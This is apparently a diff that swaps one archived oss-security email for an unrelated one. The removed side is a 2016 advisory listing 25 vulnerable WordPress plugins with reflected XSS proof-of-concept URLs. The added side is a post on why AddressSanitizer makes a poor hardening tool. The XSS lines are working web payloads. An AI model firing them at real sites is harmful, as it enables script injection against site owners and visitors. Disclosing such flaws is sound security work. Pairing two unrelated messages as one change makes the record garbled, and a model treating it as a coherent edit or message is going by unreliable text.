@@ -1,60 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/14/4
-Message-id: <51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>
-Date: Thu, 14 Apr 2016 13:07:58 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/18/1
+Message-ID: <1455754125.23003.18.camel@gmail.com>
+Date: Wed, 17 Feb 2016 19:08:45 -0500
+From: Daniel Micay <danielmicay@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: 39 XSS vulnerabilities in 35 wordpress plugins.
+Subject: Re: Address Sanitizer local root
 Content-Type: text/plain; charset=utf-8
 
-Hi List,
+ASan is also far from providing full memory safety and to a large extent
+it defeats Address Space Layout Randomization. It was strange to see a
+hardening effort enabling both PIE and ASan. Even without taking the
+runtime issues into consideration, it can make exploitation easier. It
+doesn't work with PaX ASLR for a reason. It's also incompatible with PaX
+UDEREF on x86_64 but that's a separate kind of issue since it could be
+altered to reserve the mappings in a way that's compatible.
 
-This morning I realized a flaw in my testing methodology, I used php5-cgi on the command line setting environment variables to pass the XSS payload
-to the vulnerable php code.  What I failed to realize is that if the plugin code was setting a content-header this would be missed when I used phantomJS to render
-the html output and execute any JS I had injected.  The result is only 25 of the plugins are exploitable.  The other 14 aren't XSSable because they set the content header 
-to something the browser doesn't render.  Here is a list of the remaining plugins.  I'm sorry for my mistake.
+ASan's bounds checking is great at detecting the common cases of
+overflow for debugging, but it's far from exhaustive. An attacker would
+be able to bypass it in the general case. It would make it too hard to
+exploit some vulnerabilities, but it won't prevent exploitation in
+general.
 
-Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/indexisto-inject.php Parameter:indexisto_index CVEID:2016-77360 PoC:hxxp://[target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto_index="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plugin.php Parameter:plugin CVEID:2016-77799 PoC:hxxp://[target]/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism/js.php Parameter:m CVEID:2016-77035 PoC:hxxp://[target]/wp-content/plugins/anti-plagiarism/js.php?m="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-management/preview_video.php Parameter:media CVEID:2016-77600 PoC:hxxp://[target]/wp-content/plugins/s3-video/views/video-management/preview_video.php?media="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php Parameter:page  tab CVEID:2016-77958 PoC:hxxp://[target]/wp-content/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php?page="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout-builder/includes/layout-settings.php Parameter:layout_settings_id CVEID:2016-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/includes/layout-settings.php?layout_settings_id="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_select.php Parameter:date-from date-to CVEID:2016-77217 PoC:hxxp://[target]/wp-content/plugins/e-search/tmpl/date_select.php?date-from="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az.php Parameter:title_az CVEID:2016-77217 PoC:hxxp://[target]/wp-content/plugins/e-search/tmpl/title_az.php?title_az="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/popup-insert-help.php Parameter:galleryId id  tidio-gallery CVEID:2016-77727 PoC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php Parameter:font size CVEID:2016-77506 PoC:hxxp://[target]/wp-content/plugins/parsi-font/css.php?size="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./defa-online-image-protector/redirect.php Parameter:r CVEID:2016-77193 PoC:hxxp://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-firework/firework/index.php Parameter:music text url CVEID:2016-77475 PoC:hxxp://[target]/wp-content/plugins/new-year-firework/firework/index.php?text="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserveren/edit.php Parameter:page CVEID:2016-77628 PoC:hxxp://[target]/wp-content/plugins/simpel-reserveren/edit.php?page="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-post/js.php Parameter:count interval CVEID:2016-77022 PoC:hxxp://[target]/wp-content/plugins/ajax-random-post/js.php?interval="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-editor/css.php Parameter:font size CVEID:2016-77009 PoC:hxxp://[target]/wp-content/plugins/admin-font-editor/css.php?size="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php Parameter:playlist CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/hdw-tube/playlist.php?playlist="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php Parameter:channel CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/hdw-tube/mychannel.php?channel="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/views/dashboard/index.php Parameter:p v CVEID:2016-77341 PoC:hxxp://[target]/wp-content/plugins/hero-maps-pro/views/dashboard/index.php?v="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/inc/pages/edit_styles.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/inc/pages/build.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target]/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail/pages/admin-mail-info.php Parameter:itemid CVEID:2016-77532 PoC:hxxp://[target]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-trackr_abtest_add.php Parameter:id N  WPSLT CVEID:2016-77339 PoC:hxxp://[target]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-insert-help.php Parameter:formId id  tidio-form CVEID:2016-77726 PoC:hxxp://[target]/wp-content/plugins/tidio-form/popup-insert-help.php?formId="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-content/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVEID:2016-77642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframework/js/ajax/OOAAjax.js.php?ajaxURL="><script>alert(1);</script><"
-Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infusionsoft/examples/leadscoring.php Parameter:ContactId CVEID:2016-77364 PoC:hxxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId="><script>alert(1);</script><"
+The use-after-free and double-free detection is based on the same
+quarantine technique in Valgrind. It can only detect the issues before
+allocations are flushed out of the quarantine by memory pressure. It
+does mitigate many vulnerabilities but comparable double-free detection
+could be done in malloc without the drawbacks (two flat arrays providing
+a ring buffer for a FIFO quarantine + a hash table). The same thing
+applies to write-after-free but not use-after-free, since that would
+require instrumentation in the code. A write-after-free can be detected
+by filling allocations with junk and then checking for it when it's
+flushed from the quarantine rather than instrumentation. It doesn't need
+to do the whole allocation to be useful, so there's a large range of
+tuning for performance. The junk data could come from a stream cipher
+seeded from the address if desired, but it doesn't seem important.
 
-Advisories here: http://www.vapidlabs.com/wp/wp.php
+It makes a lot of sense to use UBSan in the trapping mode for hardening,
+as it has no runtime and is simply adding extra checks branching to an
+instruction aborting the process. That includes the bounds and object-
+size sanitizers for bounds checking where object sizes are statically
+known. They could even be extended to cover cases where the compiler can
+figure out runtime size bounds at compile-time (for example, usage of
+memory directly after allocation with malloc(n)).
 
-
-Again my apologies,
-Larry
-
-
-> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@...com> wrote:
-> 
-> Hello List,
-> 
-> 
-> This was a project I worked on as part of my research in Akamai's SIRT, I initially found 1352 suspect XSS vulnerabilities but Wordpress escapes super globals GET/POST/REQUEST
-> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the time, so now I have a database of vulnerabilities that are context dependent and would need to be examined
-> individually.  I managed to automate XSS testing against the database and of 1352 39 successfully executed javascript.  These are those 39, I've manually verified they're still vulnerable.
-> 
-> They're available here http://www.vapidlabs.com/wp/wp.php
-
+Using ASan doesn't seem advisable. There would need to be an investment
+in remaking it with hardening in mind. It might not make sense to use
+the same design at all. For example, Intel MPX is much more oriented
+towards usage in production, including for hardening.
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
